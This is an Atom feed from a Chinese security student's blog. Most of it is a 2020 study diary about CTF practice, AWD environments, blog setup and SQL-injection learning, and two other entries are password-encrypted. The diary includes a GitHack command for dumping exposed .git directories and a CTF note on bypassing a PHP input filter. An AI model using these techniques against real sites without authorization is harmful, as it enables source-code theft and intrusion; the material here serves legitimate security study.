<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>可惜没如果、m0nk3y‘s Blog</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2020-11-06T14:40:49.114Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Recent arrangements</title>
    <link href="https://hack-for.fun/2986.html"/>
    <id>https://hack-for.fun/2986.html</id>
    <published>2099-11-01T04:00:00.000Z</published>
    <updated>2020-11-06T14:40:49.114Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="e74cff751fdb664faa933549740a3526d92791e4e7c549086f19710385083706"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://hack-for.fun/9b1d.html"/>
    <id>https://hack-for.fun/9b1d.html</id>
    <published>2099-10-31T16:00:00.000Z</published>
    <updated>2020-08-25T08:45:40.491Z</updated>
    
    <content type="html"><![CDATA[<p><strong>声明: 本博客的文章发布日期可能不准确, 因为我设置的url格式, 一天只能发布一篇文章, 所以我以后尽量在文章内注明发布日期</strong></p><p><strong>置顶: 博客URL 结构重新设置了, 所以之前的链接可能都无效了-.-</strong></p><blockquote><p>那一天我二十一岁，在我一生的黄金时代，我有好多奢望。我想爱，想吃，还想在一瞬间变成天上半明半暗的云。后来我才知道，生活就是个缓慢受锤的过程，人一天天老下去，奢望也一天天消失，最后变得像挨了锤的牛一样。我觉得自己会永远生猛下去，什么也锤不了我。<br>———— 王小波《黄金时代》</p></blockquote><h1 id="2020-02-10"><a href="#2020-02-10" class="headerlink" title="2020/02/10"></a>2020/02/10</h1><ul><li>学习了Docker 的一些操作, 准备部署一下AWD环境 玩下最简单的,写写环境搭建文章,相信以后会有师傅用到的</li><li>清理了一下社交圈,比如说取消了微博的无用关注,新加了C9联盟的微博,其实之前我都不用微博,但是微博也可以当做日记功能,所以又下载下来了,所以我这个博客日记也不一定会每天都写,想起了再写吧 0.0</li><li>整理了微信公众号,保留一些报社,主要留下与安全有关的公众号</li></ul><h1 id="2020-02-11"><a href="#2020-02-11" class="headerlink" title="2020/02/11"></a>2020/02/11</h1><ul><li>成功搭建了AWD 环境 ,嘿嘿 开学可以和实验室的小伙伴一起玩咯</li><li>下载了Xshell 这个东西,私认为比Finalshell好用许多,两个一起用吧 0,0</li><li>新增加博客搜索,<del>代码复制</del>,评论功能,修改默认URL格式(设置为/posts/日期),算是给博客大换血吧0,0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fi3ework&#x2F;hexo-theme-archer&#x2F;wiki&#x2F;%E5%90%AF%E7%94%A8-Algolia-%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure><p>代码复制功能感觉有点难呀,全网都没找到解决方案,都是 NEXT主题的</p><ul><li>确实减少了许多时间在无意义设计,短视频上,做事情更专注了,人也更快乐了.就是脖子有点不舒服.</li></ul><h1 id="2020-02-12"><a href="#2020-02-12" class="headerlink" title="2020/02/12"></a>2020/02/12</h1><ul><li><p>换了一个博客主题,实现了<code>代码复制</code>功能,但是<del>搜索功能</del>又没了,我决定再也折腾博客这东西了0,0(因为会上瘾</p></li><li><p>玩了一下AWD练习simple难度,但是由于<strong>我难以解决的问题</strong>,无法实现flag刷新,check,因此也无法用脚本批量打</p></li><li><p>瞎折腾了一天,收获还是挺多(假装  </p></li><li><p>码云真香 <a href="https://gitee.com/ifonlyddw/awd-platform">https://gitee.com/ifonlyddw/awd-platform</a> 以后需要搭建环境的同学呀,可以直接克隆这个仓库哟,速度高到<code>10M+</code></p></li><li><p>em…换了套AWD练习平台,我为什么要选择在这个时候练习一下,主要是囤一些脚本0,0</p></li></ul><h1 id="2020-02-13"><a href="#2020-02-13" class="headerlink" title="2020/02/13"></a>2020/02/13</h1><ul><li><p>使用CDN为博客加速, 可参考我博客的文章来进行,速度爽的飞起,</p><p>更多加速方法 <a href="https://blog.sky03.cn/posts/42790.html">https://blog.sky03.cn/posts/42790.html</a></p></li><li><p>为博客添加百度和<del>谷歌收录</del></p></li><li><p>将博客同时部署在github(境外),coding(国内),双线操作,加速访问速度</p></li><li><p>为博客添加robots.txt</p></li><li><p>还是没有搜索功能 0,0</p></li><li><p>em….<del>谷歌全家桶有了</del></p></li></ul><h1 id="2020-02-14"><a href="#2020-02-14" class="headerlink" title="2020/02/14"></a>2020/02/14</h1><ul><li>可以说我折腾博客折腾了三天呀:call_me_hand:</li></ul><p>终于实现了搜索功能 issue close <a href="https://github.com/blinkfox/hexo-theme-matery/issues/323">https://github.com/blinkfox/hexo-theme-matery/issues/323</a> </p><p>真的太神奇了</p><ul><li>实现了<code>Github + PicGo + jsdelivr </code>搭建了图床,以后就不用其他的图床了,方便管理</li></ul><p>就是PicGo 目前经常出Bug(成功上传的图片,不会显示在图库里面) .最好不要一次性传一个文件夹, 估计一个一个传会比较好,好像只能上传<code>.png</code></p><ul><li><p>更换博客背景图片,增加樱花:cherry_blossom:特效</p></li><li><p>增加显示访问者IP</p></li><li><p>优化 博客 SEO 搜索 , 由于<code>.fun</code> 域名的原因,无法申请到<code>HTTPS</code> 我无所谓了, 好好学习安全吧!</p><p>按照自己的计划来!</p></li><li><p>就是coding 有亿点不稳定 -.- 一天挂了两次 </p></li></ul><p>国内备用 gitee : <a href="https://ifonlyddw.gitee.io/">https://ifonlyddw.gitee.io/</a> (感觉数据有问题) 必须手动更新</p><ul><li>更换了<code>banner</code>图片和文章预览图片</li><li>增加<code>Gitalk</code> 留言功能, 欢迎留言版评论 添加友链</li></ul><h1 id="2020-02-15"><a href="#2020-02-15" class="headerlink" title="2020/02/15"></a>2020/02/15</h1><ul><li>现在是 凌晨 <code>2:40</code> 我打算去睡觉了 0,0 :sleeping_bed:</li><li>看看明天能不能优化一下<del>博客友链头像的</del>功能吧,然后就真的不能再更新博客主题的内容了,就这样了,我很喜欢了!!!!!!!!!</li><li>现在是 凌晨 <code>3:55</code> 博客全优化完毕! </li></ul><p>感谢师傅们的帮助, 感谢 <code>jsdelivr</code> 提供的 CDN帮助 , 感谢<code>blinkfox</code> 师傅提供的博客主题, 感谢 <code>Coding</code> <code>GitHub</code> <code>PicGo</code> 提供双线加速,和博客图库搭建,为我解决了许多问题, 感谢<code>阿里云</code> 提供的域名 ,但是不知道我<code>当初</code>买你的时候 只要 <code>8</code> 块钱就一年了, 昨天<code>14</code>号 续费一年就 要 <code>49</code> 块钱了, 感谢 <code>typora</code> 提供的编辑环境, 感谢那些发明<code>HTML JS CSS , JSON , PHP, MYSQL,等目前所有语言的</code> 发明家!</p><p>打完这段感谢,已经是<code>3:59</code> 我再去部署一下,就睡觉了.  </p><p>:sleepy: :sleeping_bed:</p><ul><li>优化了博客许多东西, loading 图片懒加载 和 代码压缩 , 优化访问速度到极限</li><li>列出 SQLi 漏洞 学习框架, 这次不打算像以前那样直接一口气学完, 而是慢一点, 最近颈椎有点不舒服</li><li>新换了一个BOX 红轴的键盘m,60% 配列, 型号是<code>anne pro 2</code>, 下面展示一下图片, 如果你喜欢机械键盘, 那么非常推荐</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200216002510.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200216002547.jpg"></p><h1 id="2020-02-16"><a href="#2020-02-16" class="headerlink" title="2020/02/16"></a>2020/02/16</h1><ul><li>复习了一下SQL语法</li><li>搭建了一个在线靶场,本来只是想搭个SQLi-labs,后面就想直接搞个平台算了</li></ul><p><a href="http://129.211.79.54/">http://129.211.79.54/</a></p><p>算是完成我当时在高数课上的构想了 0,0 寒假项目也就这样了吧, 搭建一个漏洞平台,录视频, 搭AWD , 学基础漏洞, 就差日站了,不,我SQLi还没学完, 我还想复现 CVE, 但是人不可能不睡觉吧</p><ul><li>反正就是瞎搞了一天, 明天开始专注起来! :dog:</li></ul><h1 id="2020-02-17"><a href="#2020-02-17" class="headerlink" title="2020/02/17"></a>2020/02/17</h1><p>换了套键帽</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200221234856.JPG"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200221234908.JPG"></p><h1 id="2020-02-19"><a href="#2020-02-19" class="headerlink" title="2020/02/19"></a>2020/02/19</h1><ul><li>最近有点飘?</li></ul><h1 id="2020-02-21"><a href="#2020-02-21" class="headerlink" title="2020/02/21"></a>2020/02/21</h1><p>今天放松了下自己的身心, 准备调整作息了, 感觉熬了一个寒假的夜 身体有点不行了,主要是熬夜效率太低的话就没必要熬夜,还不如早期</p><p>所以从就今天起 <strong>12点睡觉,7:40起床</strong></p><p>先坚持一个星期再说,每天在寝室群打卡好吧! ^.^ </p><p>明天一天看完SQL注入那本书! </p><h1 id="2020-02-22"><a href="#2020-02-22" class="headerlink" title="2020/02/22"></a>2020/02/22</h1><p>更新了kali </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt full-upgrade</span><br></pre></td></tr></table></figure><p>在虚拟机上面安装了ubuntu, 准备在虚拟机上搭建AWD环境,实验一下能否实现flag动态刷新,</p><p>我觉得学习SQLi 看那本书 , 看的真的好没有劲…. 还不如老老实实把SQL-labs 刷完.</p><h1 id="2020-02-23"><a href="#2020-02-23" class="headerlink" title="2020/02/23"></a>2020/02/23</h1><p>vim 一键删除所有内容: <code>ggdG</code></p><p>gg 为跳转到文件首行, dG 为删除光标所在行以及所其下的所有行的内容</p><p>研究了两道比较有趣的题,比起看书有意思多了,可想而知之前浪费了多少时间!!!!</p><h1 id="2020-02-24"><a href="#2020-02-24" class="headerlink" title="2020/02/24"></a>2020/02/24</h1><p>最近的学习计划就是练习下CTF(WP复现 , 😄)</p><p>em… pycharm 一键格式化代码</p><p><code>Ctrl+A</code> 全选 <code>Ctrl+Alt+L</code> 在PHPstorm 里同样也是</p><h1 id="2020-02-25"><a href="#2020-02-25" class="headerlink" title="2020/02/25"></a>2020/02/25</h1><ul><li>看老大的 celebration of life 仪式, 熬夜到5点,相当于通宵了吧,u1s1,通宵真的好伤身体,第二天感觉身体都是软的</li></ul><h1 id="2020-02-29"><a href="#2020-02-29" class="headerlink" title="2020/02/29"></a>2020/02/29</h1><p>GitHack, 用 cmd 运行, 先 cd 到 GitHack 目录下, 然后 <code>python2  GitHack.py yoururl/.git/</code></p><p>呜呜呜, 以前一直以为是我环境有问题 0.0</p><p>其他工具同理</p><h1 id="2020-年-3-月计划"><a href="#2020-年-3-月计划" class="headerlink" title="2020 年 3 月计划"></a>2020 年 3 月计划</h1><p>深入学习 session cookie 机制, webshell 混淆,免杀原理, 反弹shell ,</p><p> 框架学习(mvc, flask,tp,python 网络爬虫), 熟练用python或者php编写poc</p><p>掌握大概的漏洞挖掘(SRC)的思路, <strong>6月前必须出一个漏洞</strong> ,不管是什么等级的</p><p>多运动,如果开学了,记得每个星期不得少于3次运动, 规律作息,不吃垃圾食品, and  保持微笑😊</p><p>最近的CTF 比赛比较爱出 node js …. 我js 都不会编.. 慢慢学, 多正反馈就ok</p><h1 id="CTF-与知识学习"><a href="#CTF-与知识学习" class="headerlink" title="CTF  与知识学习"></a>CTF  与知识学习</h1><ol><li>学到东西是关键</li><li>日常看到的点,不要仅仅是看过,要去复现</li><li>有时候不是不会,而是你没有去研究过</li><li>多研究,以赛代练</li><li>扩大知识面(常见漏洞,学习开发,复现题目代码等)</li><li>前期书籍(博客文,网上总结)+刷题</li><li>巩固所学的各类基础漏洞知识</li><li>尝试利用php,python编写exp,工具平台</li><li>现实漏洞的复现,cve,cms等</li><li>尝试从做题人转变为出题人</li></ol><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><ul><li>漏洞审查能力</li><li>快速编写脚本的能力</li><li>权限维持的能力</li></ul><h1 id="需要什么"><a href="#需要什么" class="headerlink" title="需要什么"></a>需要什么</h1><ul><li>丰富的代码审计技巧</li><li>熟练运用python</li><li>一整套自己的权限维持流程</li></ul><h1 id="2020-03-08"><a href="#2020-03-08" class="headerlink" title="2020/03/08"></a>2020/03/08</h1><ul><li><p>不知道为什么突然就感觉压力好大 , 老铁</p></li><li><p>可能是因为做xctf第一场把..好多都没见过,好不容易一个题突破就去了,后面还有更多的点要去做.其实还是太菜了 :-(</p></li><li><p>无意中看的p3师傅的一篇文章, 又给了我动力, 我关掉了所有打开的窗口,写下今天的感受,菜其实不是原因,不努力才是原因</p></li><li><p>就这样吧. 多折腾,不要放弃</p></li></ul><h1 id="2020-03-13"><a href="#2020-03-13" class="headerlink" title="2020/03/13"></a>2020/03/13</h1><p>继续学习了php反序列化和文件上传, 还有curl 下载文件确实是第一次遇见呀!!!真的可以,师傅们就是厉害-.-</p><p>不多说了,明天上午起来做题之前把curl 的操作总结一遍,(其实之前就想总结的,但是太懒了), 0.0 😁</p><p>binwalk 提取文件 -e (extract)</p><h1 id="2020-03-14"><a href="#2020-03-14" class="headerlink" title="2020/03/14"></a>2020/03/14</h1><p>挖了某大学的图书馆后台的一个最菜的漏洞…已经提交不知道能不能过,还是挺激动的,第一个漏洞…. 专属SRC太难挖了 从公益SRC开始学习吧…</p><p>还是主要的心思在学习技术和代码审计以及打CTF(和挖洞不冲突,晚上挖洞,白天瞎搞)</p><p>😄</p><h1 id="2020-03-16"><a href="#2020-03-16" class="headerlink" title="2020/03/16"></a>2020/03/16</h1><ul><li>今天有点水…. 打算重头刷一遍DVWA吧, 然后练习python 编程…</li><li>准备搭建属于自己的XSS平台</li><li>提前完成周边中的计划</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 复习以前做的CTF题的思路,整理一下电脑</span><br><span class="line">2. 准备开始挖SRC,先从公益SRC开始练习吧..后面再审一下CMS</span><br><span class="line">3. 练习编程</span><br><span class="line">4. 可能会开始学一下高数和大物</span><br></pre></td></tr></table></figure><ul><li>每天抽1个小时左右的时间,从头开始学高数和大物,根据目前的行情来看,极有可能很晚才开学,要是去学校就来个测试什么的,那不是凉透了!!!</li></ul><h1 id="2020-03-20"><a href="#2020-03-20" class="headerlink" title="2020/03/20"></a>2020/03/20</h1><p>phpstorm 全局搜索快捷键 <code>ctrl + shift + f </code> 舒服啦</p><p>交了一个洞给CNVD…要是能过我就很开心了 😄</p><blockquote><p>前台潜在的漏洞点就是搜索功能、留言板功能，后台潜在的漏洞点就是登录框注入、cookie的认证问题或是其他未授权访问、CSRF等常见的漏洞</p></blockquote><p>建站系统CMS 审计思路:   <code>代码分析 =&gt; 功能点</code> <code>动态审计 =&gt; 静态审计</code> <code>参数格式化漏洞 =&gt; 可控参数</code> </p><h1 id="2020-03-23"><a href="#2020-03-23" class="headerlink" title="2020/03/23"></a>2020/03/23</h1><p>总结了一点道理</p><ul><li>每天不一定是安排的越满越好, 最好留一点时间给自己去”充电”,这里的充电当然也还是和安全学习有关,只是不要仅仅局限于当前所学的内容,比如看看每日推送的一些文章,感兴趣的文章, 虽然现在没能力复现, 但是可以拓宽知识面和见识,未来的某一天说不定就会用到</li><li>打CTF , 其实和高考 , 四级这些考试,在某些地方有点类似, 比如: 细心,抓住每一个细节, 不放过每一个请求, 甚至连HTML的代码都可以读一读,再者, 多刷题, 考试多刷题的作用,帮助理解知识点,灵活运用知识点,扩展知识点,提炼技巧,在CTF中,挖洞和渗透或许也是如此</li><li>明天记得洗袜子和刷球鞋~</li></ul><h1 id="2020-03-25"><a href="#2020-03-25" class="headerlink" title="2020/03/25"></a>2020/03/25</h1><p>今天不知道咋想的…一心想去搭建CTFd这个平台,可自己太菜了.弄了一天都没弄了…. 还是老老实实学技术把…别再瞎搞了</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200325010107.png"></p><h1 id="2020-04-07"><a href="#2020-04-07" class="headerlink" title="2020/04/07"></a>2020/04/07</h1><p>写于凌晨, buu 做难题做到自闭了, 打算练习一下开发能力</p><p>四月计划, 感觉到了大学,就没有什么写计划的计划, 有好处也有坏处, 坏处就是容易精神涣散, 找不到事做</p><h1 id="2020-04-12"><a href="#2020-04-12" class="headerlink" title="2020/04/12"></a>2020/04/12</h1><p>在MYSQL中, <code>1000</code> 和<code>&#39;1000&#39;</code> 是一样的,但是有些时候就可以用来绕过</p><p>比如这段代码, 要id为1000, 才输出flag, 这里ban了 <code>x</code> 故16进制无法绕过了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;&#x2F;or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+&#x2F;i&quot;,$id))</span><br></pre></td></tr></table></figure><p>今天做了ctfshow这个平台的题, 很多小点以前都没有注意到, 可以说收获还是挺大, 不过以后学东西要学稳一点了</p><h1 id="2020-04-13"><a href="#2020-04-13" class="headerlink" title="2020/04/13"></a>2020/04/13</h1><p>昨天已经说过了, 不要水群了, </p><p>今天删了一点博客的文章, 觉得写的不好, 相当于没写的那种, 而且网上一搜一大把, 就把删了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;声明: 本博客的文章发布日期可能不准确, 因为我设置的url格式, 一天只能发布一篇文章, 所以我以后尽量在文章内注明发布日期&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;置顶: 博客URL 结构重新设置了, 所以之前的链接可能都无效了-.-&lt;/stro</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Chrome 浏览器扩展开发初试</title>
    <link href="https://hack-for.fun/62d1.html"/>
    <id>https://hack-for.fun/62d1.html</id>
    <published>2020-11-07T05:04:25.000Z</published>
    <updated>2020-11-07T15:11:59.324Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="f5a0bf778cc83bf6ec67ac2e1b783c70c134fd8c3e3fe78ef8044666745781ad">b0cd213e786428c2f4163bc7fc936f3ab4f8357a47a76c02d7a0cdea4dba773799e908ddf5520a1ef5ab0c2439a478e7b256551082f599c54e4c77f29b86aad9f5f39ddf1617ec50f4538e2c11a88ab9b8ed965cf691a190ea671889a68e99c652ada8430575d2d2d7a8c8ab4397b7e60bc0c95435531dfa89f326f81c0f2367f738c1c74942df245f79cef23ccd684c48c5ed6142b82bb1aae196aff549a1163e4b51efbd02dd8760b373a18b484e935931513f900ab239c070522333f73edda6096d4ad71211a6d7d8a5c64c0f66866b6d76007d968df90fc468f85545f6e150f5082626a8b489de98f0f0bb37581d325b603b2778ab6ca2a942bae26a928562416adcd0a0fd2afa40eec3b8c42f495ab437406c6d2e1e041179b2f0fee1bcba1595abd1ef9feb15eff6c3801f04f44cd18429e605cae5a4cc09c4a2d3b65c678aafca270e2fda54ab5966896cf036533465356d4762443349378ff3bf8aa857d747132424dd6d627914fafb05a57909ff4655dd85a84863312af3b0e748f7ece50f8dd101fdca24d34543f041261367a2907a3ed79e09c4240276afc635220443fe9e611925bfc9477481466489168adfef2db4cb0d442cf253a467c95c42ea44b443038b408f394f9bf213c46f0bc94a7ebb6c176b8a1f5c2649b406682eb3abddbf39ab4764cd3da79f0dcba8df6551078c71df533eccb5cf7eb8a629649c620156f06c208754983a01c81ca9ad7047334ed04b344e8908ffd335ad6af46bd4a5fa8c4a8ae82209e07f155ee7d14573afd613c241cd61b813d6d6aa09bade70585eaa29371d59720e34f44838e61abd0fea38c3f9603c6165ea5336d558d016c42551eabfa0c95e966dfe2c3ad37b166be7e78ef5019cb1d30f434abf089ab2ac5ec16036e25a9b16a987c2ac62c46c02190ce530269bfed579435f25a050aca1c7ddbe95f3073d27c1c4dde47d480bfa527d26b0b3d9cb42079a33d64e0ee8a3d00816010d8d8c38c1fccf9701520e4d78e0b178ed31c5aebf50795e202d38bec5882a90b3dc8cf2b45000f28df9ab8e02b66ab8e4d19160348d769af50b91c96ec5fe27174bf79c724c2e13fb9656ad32bc43bae54e934e5cbb679480f2b467f6ac15e273b72c15be4932ee3e35fc20fb66dd44350f7617cfa329faf4e555f5d49a3297c952e57a35029bc727b25f8266fd562c3e7cfc2568440bd8b9e63ef7f02e31118e20656561f8e49f4c9b0499fe06a3484484c9a7e063a3cce8f74542937ee5ac50c7c543626d2bd49066f88af751387dc1d4c2e48157de7b18ba794b7300b880b294afef85cf29d869ac68ec5cb71bfe8944639d5b1011b0b24fd54b0d9b0cc82ff1cff6d993d6c917becd12628e9a1c4fdc0fc77654a1347fd04617b575dbff511026b54b62df2475cb7bc65bbcf6d5ff773ef24dc7c39fd49fe8fd4428c6d0f37a3b1e8e27103b8cc2dde52a60652facfbb66fcf45453fcb8f3576e5f6f884ee64349654c1d4cf5c4e48db0811ce14455a07d16809c1de0d5c4dd6e9f724391fea05d6f83370d0d8b0bcf2fcf0849bf28370e8557c983c5aefa6a3cbf2e90a9ca912a5542d82a6c379ee4417276affbede64e2f7688b6027c6cf0d47db2caabe3d9341bec86b92bf3647a50376b76d254d0a1682ca2262d8b7d5de3c3991c13077bce42765ddedc97697e7a5b32e895c88b2aff806a7c1792e2d50c18f219f9706bb8c29879db9cf1e8f1ef0f7313bc7b6732d48687829e92a78ccb532c01920d849f5b22207e70a944256db740933e427ddea23be68ae5d9522e5e0fede1f877d5e6cb856ffd1f057e3619f8a63a3c73e807f0c75bc93ee423ae5452963a388e7d14a29af4b0e64a212a5578f7372708fc1074ea7ec054124d18e776d3efea018f24e139b6a357ac48328d42b9385d6a0b7f270fcd5d0794b508668d33940b0ddfca980761c63d4c9d5fee6956982501ef7d98b84c94f5d4fd24517c7a55f4f15d04f52359c29c8c4845bbb861a4e123ba78e2838385f2fa72ff7534364ee93015b421e569000410d5c23def491fb8df6bf1e6f3f1b9ac37f27c1ced72c22cf53da013b4ab9bbfd9b6f494894e96624e2650475ffc3fd41a46d142e98f89387629a701a85645b8506203a21e05cb74463904ecbe9229d9be4140438af402955ecbf274fa8d5b010292ccde3c01139bbb8e28bffcad0934e2b5a6dada029098d4b456d77fffe346ffc75fce2fe96e5d54324888b6784e94880c249e7950e5781396bde323e64fd0f16f9047643119d6007dc9fa371de856194c4e8002a4e1de4b8309424aff5f6753c6957640c761dcf4c011141ff23f81d00d0366f48fc92703a04620e53e4dc5f05f307746fe3c6e55c37db8f7f9d090b0a3b2675deb3707ce348c0658f4df78bcc4bb3c4f14bfd724b98e9ce7e55f46424cede58f36676b81fcace724ecd3fe96e18bb01efe9f635f7476caf24ea8e78fbbc7a2e488a27d7f029312da44a6f4b7bf5beb1ed87664b93a6a627eae308ee537eef8f335538ca5fa4fa10c2e8d64bb83fd6681cd130ae720b7d97b7814b3031951786132f26fada54cf082c4d87fee503c7666976977541fb2e1ca114bc1468e23947ef64d3bac5bee20b0ae6a2d0dce8e724a813c186219f8d46508828b4dfe41e0e91ecb87f2315657ceb35b5310876e84ab56c62ab19cbd492eee74fe2fdb3cc8dd33c7a6af47f5369d11448a2a59633e2f53d18df1d59e4f7fc0c175d5c9b6e287f7dc4ceec3989c49937f2f98f40da7be31462e91cc69e52b7f776c0e694c45ef5783a242df7ff15177216419741bc2ce32b4e1c30f153c43bc4d31ff7a21c6a177d4c477e7b24523b918fd5e4363e6e094e8e6341c00c04a3d8648f350e78b499012ee81d06a8d2f3b6bd992724e09f219179874abe4fa2594f4ee74544b2971aaeb200cd90f5be9352ec97b59ae0f2f9b4f22b8264cc18685d62d71aaf44a4abbcb789538234f9b4665c651ba74a7a7a72a40574c7e98f73f620e4c2bc42e2b46c5e744caf2fb6c63dca7f94d18c48f6f77b08ac067f5acc828e2bcc544845dd29975323d35c9499b1b4bb7da0d2dbe9099bb1825122435aee43a4c761f36f5d8a6d8e113cc2c97eda68b6d66dca664fa04b4b6893c1a2965bc6478dbbf5a4627719dbf263554e7830c9228f4d2e06c18cd527b50cbd6715e8cdaff75c4a1116e02d8ae66bbc2d004b0d0c118113949d0c183337d56db46d275fd5f1c9be4134fce9dbc11836fddea015caccf871e871efa669873e01a8379f45facd86c4e0fcda96832a76bdf97dc2037169de5925bdf6298c7186551b497c65bbddd3174d82fb50aebab2c27dcf11b7a4996ebeda9d24755a6376af90a41ef0e76ad6b3e3474afe6e29c69bcbb8b28ef418fa0dd612ac6c69f726febd67b0260cc1151c026bbd7fd02f2be447ca69f865d7ed161b8d4b9ed516e077a698350228b54a7b4cac63105f1e257cdad0eabd094fd591bd127c2b5b3842785efa6dd4db25bf78b7595c6de137e36f8a4b50125ec4fbe44fd1f3840517d17901a23567831c41911ea6692355d63495852a004f46be743b3d51df4224ad57a6e7efadf4266f0b13ce2ebc88da279db13d74b664c3c7ef8caf5570513d233daf1ed743ae141469cd1eb7c9e09fe72be23d1998cea2b988caa9c397ac255b0aeee333a92a2de6b75cd3897db21716188e149286dfd43cc807e738f6b82f1109e1b0513ebf74cc8d21e5242d7026a65991789797015fa62fff2b9569fdca234307f254624d9329ce52f825e7f1cea2054eeac2a867583632f5dab4787e0901661d1e6430937a89f67057cdbcd6b8b614cbb7fa79ceb958f2c2275c4b574295ace647fc294014d27815a27ada5260532c0c69b615ff0713bdbcea8d3e00768b1cf9764b6ea36ae16a77f32b3ff2d8d087b4d754f5e1d0009e407809ae09a55fdfb0645b6d94d868341b93baed0e4289aa610605b5a11b016fda38fbb156d51a4049f159f052bc5b8a5e14c85bfd530f6fc3300f2c81b4faf777d99f30d09592f7c5a81e965860450c0e40e5412a50c7d390b639c5f6158352d8fac8b0ffd9ef99a0907ab45543dd2c3f51658e4103c343af881ec09d77fd1eb982d4ff41108e4d4511f6c105b36620690044461844b5e161e90e839113ae136767c01a0e9d3b36111a00e67d442085fd0eabb938f67de461f40b271e50cbcf90ecef5941778498e8025710f9a2250ddf194aa31463d10283e4706003b0845f0d0cd0499af0c712bc1fc1c5a7003175f56274dc8641fd5eebd9fb93fd5b21aa8605062acacba84c9002325cd77363f9dc455b97b815a04a659321c88ac9c6c3d4928675f0bbeef6d5bbecac9c1b4c46a993d85c002d3542dfde9cd07346906ec21ea13f67313dc721d87bf60ff269978c33c78f4138c52adbc9f509ccfeae4cb4d209bec000e94f67ad158256b8db18f3425fc0572acfaa3e2140d18307229eb801200a3676f0821cd9bd9247740d1b69c2a78a3441e91c6daf4def9b8578efa8d23e6d1bd2d557fb8cb962971efce906aa9ef2b2038e71655ea5a7a4d5111407ec76657b32177a57648103b526ecf5a002ee999c3b803db100cea10afcae929e510ca1e1c0fd8735b4ed81e6bc2e290045ba614819ea55a2bfc4fc876416f85cdd606e43227fed4e513e9e1777ddcdd2441d5bc236928dfbc8675f41c398f5dd45cf2ab580fcbb58d49e8806152300f76b0707c85ad9cb2d6147ede1436c819539090d37d9dbe335f9042e46465fc74bd0e048ca0415c3d90a6f297cb5e2e952b91ccdd8e0f2cbaa6a34c6eec0b8bfe24599062dc3105dc023a4361d349b565d7afd1b644a4c9e65727de7614fb8e0b8e74d6583ef318621bb1a896543ebd642088e11b0d9ec2e0a6c3513c4fbca2985b2f66d767dad29da89b012f7fc8114f4140b06acb4dda5ead26863322d23b27d2208ff8e3c6abc30b85afc23195e15051a6c0d30c5e130fdda4255e24594f5e48d39a2a1e137af68794b8a06480a8353c626c2856bb886529a38e162b2d053f7d6bd0a5e3572370fc9d1966bea8e88f134fe2d992630b48d9d2591471b7d29a82ee1204c897804b653a63bbf41307d6340dd72a7a78b9674f4ce5acb3a74fce7dba0afd9be497d72d8d2f94468e701dd563238f300ff260dc9cb97adda604cfed49b300d79d3ebf6581548c3cce4b3e61f1810a4021fe34b2de6dd671ca83bef1706614355c9e74e51e4ae172c7c0a5ec2c1436a1ac70ce0b005dfbe79929484a1a39b2d2ae9feb63a1681d9870c2cd468769271ede02a7564bc756ab521d294aff8ab73e828f30183b8f9df6781fe3ac8fede6281d023ee7cd6d43237955bb11535a73516b3d2cbd6848c1ccacc3063538471beb1abd1cd8422ca1855fa97e264d1103533a229386a4d258e075ad6b54f6205ec4a7698a3ee97c1478d6782c55d702db0e61a7d86a9b5277cb58d47a772554f4e37928ff82f94c558790fdaee1988bddc0bd27dab34c6197e2fa47bb3415f229851471310b0264121a0bb9a5d5a27d455a8b3d385a5505f87c7912c4f37ab84e49126d8f4125719340431dd3fcb0f02120e7eb1b019fd06a56557a5c4cd8caf12344a1597869af0c8df532d09a9b35ba8996a8b500d1d66ff12619043e83077330933476e0d87abec2173124d2a937979a4d3ca77f47cba95338590077aeaccd5584bfd13d5b4f0a7e0512083362d64887ba62099b20038c82a8db7072e2635f53fcd723